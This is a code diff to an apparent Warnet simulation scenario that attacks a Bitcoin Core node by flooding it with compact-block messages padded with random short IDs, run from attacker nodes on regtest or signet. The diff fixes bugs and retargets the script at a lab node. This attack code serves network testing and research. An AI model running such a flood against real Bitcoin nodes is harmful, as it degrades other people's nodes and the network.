@@ -11,6 +11,7 @@ from commander import Commander
 
 from test_framework.blocktools import (
     create_block,
+    NORMAL_GBT_REQUEST_PARAMS
 )
 
 # The entire Bitcoin Core test_framework directory is available as a library
@@ -41,23 +42,23 @@ class CmpctAtk(Commander):
         parser.usage = "warnet run scenarios/cmpctatk.py"
 
     def build_block_on_tip(self, node):
-        block = create_block(hashprev=int(node.getbestblockhash(), 16))
+        block = create_block(tmpl=node.getblocktemplate(NORMAL_GBT_REQUEST_PARAMS))
         block.solve()
         return block
 
     def build_fat_empty_cmpct(self, node):
+        block = self.build_block_on_tip(node)
         cmpct_block = P2PHeaderAndShortIDs()
         cmpct_block.header = CBlockHeader(block)
 
-        for i in range(100_000):
+        for i in range(1_000):
             shortid = int.from_bytes(random.randbytes(6), byteorder='little')
             cmpct_block.shortids.append(shortid)
 
         return cmpct_block
 
-
     def run_test(self):
-        victim = "TARGET_TANK_NAME.default.svc"
+        victim = "tank1"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -81,12 +82,13 @@ class CmpctAtk(Commander):
             attackers.append(attacker)
 
         attack_block = self.build_fat_empty_cmpct(self.nodes[0])
+        attack_block_msg = msg_cmpctblock(attack_block)
         next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
         while True:
-            now = datetime.datetime.now()
+            now = datetime.now()
             if now > next_block_interrupt_time:
                 attack_block = self.build_fat_empty_cmpct(self.nodes[0])
-                attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
+                attack_block_msg = msg_cmpctblock(attack_block)
                 next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
 
             for attacker in attackers:
